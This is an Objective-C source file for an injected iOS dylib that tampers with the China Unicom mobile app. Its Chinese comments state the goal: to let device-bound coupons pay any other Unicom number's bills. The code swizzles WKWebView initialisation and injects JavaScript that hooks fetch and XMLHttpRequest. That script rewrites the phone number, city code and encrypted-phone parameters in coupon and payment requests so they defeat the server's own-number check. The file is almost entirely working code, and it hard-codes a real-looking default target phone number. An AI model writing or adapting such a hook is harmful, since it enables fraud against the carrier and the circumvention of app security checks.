//
//  couponhook.m
//  TrollStore dylib 注入中国联通 App (com.chinaunicom.mobilebusiness)
//  作用: 让 "本机券" 能用于给任意联通号交费
//  原理:
//   1. hook WKWebView 初始化, 给交费页 H5 注入 JS
//   2. 注入的 JS hook fetch/XHR, 把查券(getNineGrid)和下单校验(mobAppPayFeeCheck/Apply)
//      请求里的 commonBean.phoneNo / commonBean.cityCode / custom.currentPhoneNumberAes
//      改写成目标号, 使 服务端看到的 "本机号" == "充值号" == 目标号, 骗过本机校验
//  零依赖: 只用 Objective-C runtime, 不需要 theos/CydiaSubstrate
//
#import <objc/runtime.h>
#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>

#pragma mark - 配置区 (默认常量, 可被 config_gen.h 覆盖) ----------------------
// 想用本机券给哪个联通号交费 (CI / 本地 make 通过 TARGET_PHONE 覆盖, 不必改源码)
// 目标号归属地城市码 (湖北=724, 天津=110, 北京=010 ... 按目标号实际归属地填)
// 用 frida_locate.py 在真机拿到 encrypt(kTargetPhone) 的密文后, 通过 TARGET_PHONE_AES 传入
// 没填密文(__FILL_FROM_FRIDA__)时: phoneNo/cityCode 仍会改写, 但 currentPhoneNumberAes 不动
#include "config_gen.h"
#ifndef TARGET_PHONE
#define TARGET_PHONE @"15629799900"
#endif
#ifndef TARGET_CITY
#define TARGET_CITY @"724"
#endif
#ifndef TARGET_PHONE_AES
#define TARGET_PHONE_AES @"__FILL_FROM_FRIDA__"
#endif
static NSString *const kTargetPhone = TARGET_PHONE;
static NSString *const kTargetCity  = TARGET_CITY;
static NSString *const kTargetPhoneAes = TARGET_PHONE_AES;
#pragma mark ----------------------------------------------------------------

// 注入 WebView 的 JS: hook fetch / XMLHttpRequest, 改写查券与下单请求
static NSString *InjectJS(void){
    NSString *fmt =
    @"(function(){"
    "  var T='%@'; var C='%@'; var A='%@';"
    "  function setP(u,k,v){try{var x=u.split('?');if(x.length<2)return u;"
    "    var p=new URLSearchParams(x[1]); p.set(k,v); return x[0]+'?'+p.toString();}catch(e){return u;}}"
    "  function rw(u){"
    "    if(u.indexOf('getNineGrid.action')>-1){u=setP(u,'commonBean.phoneNo',T);u=setP(u,'commonBean.cityCode',C);}"
    "    if(u.indexOf('mobAppPayFeeCheck')>-1||u.indexOf('mobAppPayFeeApply')>-1){"
    "      u=setP(u,'commonBean.phoneNo',T);u=setP(u,'commonBean.cityCode',C);"
    "      if(A.indexOf('__FILL')===-1){u=setP(u,'custom.currentPhoneNumberAes',A);}"
    "    }"
    "    return u;"
    "  }"
    "  var of=window.fetch;"
    "  window.fetch=function(i,o){var u=(typeof i==='string')?i:(i&&i.url);"
    "    if(u&&(u.indexOf('getNineGrid')>-1||u.indexOf('mobAppPayFeeCheck')>-1||u.indexOf('mobAppPayFeeApply')>-1)){"
    "      var n=rw(u); if(typeof i==='string')i=n; else if(i&&i.url)Object.defineProperty(i,'url',{value:n,configurable:true});}"
    "    return of.apply(this,arguments);};"
    "  var oo=XMLHttpRequest.prototype.open;"
    "  XMLHttpRequest.prototype.open=function(m,u){"
    "    if(u&&(u.indexOf('getNineGrid')>-1||u.indexOf('mobAppPayFeeCheck')>-1||u.indexOf('mobAppPayFeeApply')>-1)){u=rw(u);}"
    "    return oo.call(this,m,u);};"
    "  console.log('[coupon_hook] target='+T);"
    "})();";
    return [NSString stringWithFormat:fmt, kTargetPhone, kTargetCity, kTargetPhoneAes];
}

static NSMutableSet *g_injected = nil;

static void AddScriptToConfig(WKWebViewConfiguration *cfg){
    if(!cfg) return;
    if(!g_injected) g_injected = [NSMutableSet new];
    @synchronized(g_injected){
        if([g_injected containsObject:@((uintptr_t)cfg)]) return;
        [g_injected addObject:@((uintptr_t)cfg)];
    }
    NSString *js = InjectJS();
    Class usCls = NSClassFromString(@"WKUserScript");
    if(!usCls || !js) return;
    // AtDocumentStart: 在页面 JS 执行前就 hook 掉 fetch/XHR
    id script = [[usCls alloc] initWithSource:js
                               injectionTime:WKUserScriptInjectionTimeAtDocumentStart
                            forMainFrameOnly:NO];
    [[cfg userContentController] addUserScript:script];
}

__attribute__((constructor)) static void TweakInit(void){
    // 延迟到 App 主线程起来后再 hook, 避免早期初始化竞争
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{
        Class cls = objc_getClass("WKWebView");
        if(!cls) return;
        SEL sel = @selector(initWithFrame:configuration:);
        Method m = class_getInstanceMethod(cls, sel);
        if(!m) return;
        typedef WKWebView *(*orig_t)(id, SEL, CGRect, WKWebViewConfiguration *);
        orig_t orig = (orig_t)method_getImplementation(m);
        method_setImplementation(m, imp_implementationWithBlock(
            ^(id self, CGRect frame, WKWebViewConfiguration *cfg){
                WKWebView *wv = orig(self, sel, frame, cfg);
                // WKWebView 内部会持有 configuration 的 copy, 直接对返回对象的 configuration 加脚本最稳
                if(wv) AddScriptToConfig([wv configuration]);
                return wv;
            }));
    });
}
